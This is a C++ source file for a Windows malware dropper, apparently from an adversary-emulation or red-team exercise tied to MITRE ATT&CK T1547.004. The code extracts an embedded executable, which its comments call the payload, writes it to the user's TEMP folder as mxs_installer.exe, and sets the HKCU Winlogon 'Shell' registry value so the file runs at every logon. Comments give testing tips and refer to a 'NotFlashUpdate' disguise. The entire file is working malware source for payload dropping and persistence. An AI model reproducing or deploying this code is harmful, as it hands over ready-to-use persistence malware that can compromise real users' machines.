#include <windows.h>
#include <WinUser.h>
#include <iostream>
#include <fstream>
#include <string>
#include <cstdio>
#include "resource.h"

using namespace std;

#define default_open_key HKEY_CURRENT_USER // Used in the second half, cleaner to keep up here

int main() {

	// Embedding an exe as a resource in another exe

	// This will need to be updated if you name your resource something else
	HRSRC hResource = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_MXS_BIN1), L"MXS_BIN");
	if (!hResource)
		return(1);

	HGLOBAL hGlobal = LoadResource(NULL, hResource);
	if (!hGlobal)
		return(2);

	DWORD exeSiz = SizeofResource(NULL, hResource);
	if (!exeSiz)
		return(3);

	void* exeBuf = LockResource(hGlobal);
	if (!exeBuf)
		return(4);

	//Retrieve the value of env variable TEMP
	char* buf = nullptr;
	size_t size = 0;
	_dupenv_s(&buf, &size, "TEMP");
	std::string temp_path = std::string(buf);
	free(buf);
	//Convert the env var path to wstring and perform directory listing

	// dynamically assigns the mxs_installer.exe (payload) to drop to the users local TEMP directory
	string full_path = string(temp_path) + "\\mxs_installer.exe";

	ofstream outfile(full_path.c_str(), ios::binary);
	if (!outfile.is_open())
		return(6);

	int res = (outfile.write((char*)exeBuf, exeSiz)) ? 0 : 7;
	outfile.close();

	/* USEFUL TESTING AREA ************************
	*
	This can be pretty weird to test locally to see if it works.
	Maybe you don't want to actually inject your own machine. So, instead, run a different exe on logon.
	In fact, it's easiest to test by using the dropper itself - all it does is place an exe!
	Instead of running the dropped Injector during logon, run the NotFlashUpdate / Dropper during logon!

	To test:
	1. compile and run the program (you still gotta run it to modify the registry key).
	3. place the compiled program on your Desktop, or wherever else as you may specify below
	2. delete the dropped file (current dropped in your local AppData\Temp folder)
	3. log out and log in.

	If the dropped file reappears, you've successfully run an exe on logon.
	Today droppers, tomorrow injectors and guards!

	*/

	// CHOOSE YOUR FIGHTER
	string exe_location = full_path; //UNCOMMENT FOR RELEASE

	//END USEFUL TESTING AREA ********************

        // MITRE ATT&CK Techniques:
        //      T1547.004: Boot or Logon Autostart Execution: Winlogon Helper DLL
        // CTI:
        //      https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf

	// opening a registry key

	const string reg_path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"; //open on login
	const string key_value = "Shell";//via a shell
	// if exe_location is undefined, uncomment one of the two options above
	const string path = exe_location + ",C:\\Windows\\explorer.exe";//both the exe I want and also normal startup

	HKEY run_key;

	auto status = RegOpenKeyExA(default_open_key, reg_path.c_str(), 0, KEY_WRITE | KEY_QUERY_VALUE, &run_key);

	// std::cout << status;

	// Error Handing for opening or reading reg keys

	if (status != ERROR_SUCCESS) {
		if (status == ERROR_FILE_NOT_FOUND) {
			//std::cerr << "Key not found";
			return(1);
		}
		else {
			//std::cerr << "Opening key failed.";
			std::cerr << status;
			return(1);
		}
	}

	// Setting a registry key value

	status = RegSetValueExA(
		run_key,
		key_value.c_str(),
		0,
		REG_SZ,
		(LPCBYTE)path.c_str(),
		path.size() + 1);

	if (status != ERROR_SUCCESS) {
		//std::cerr << "Setting key value failed.";
		return(1);
	}

	// Close the registry key
	RegCloseKey(run_key);
	return(0);
}
